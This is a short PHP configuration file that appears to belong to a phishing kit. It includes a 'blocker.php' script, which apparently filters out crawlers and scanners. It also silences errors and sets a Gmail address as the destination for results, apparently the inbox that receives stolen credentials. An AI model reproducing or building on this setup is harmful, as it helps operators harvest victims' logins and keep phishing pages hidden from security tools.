<?php
include('blocker.php');
error_reporting(0);
$ur_email   = "keyword.tech.2017@gmail.com";
define("EMAIL", "$ur_email");
?>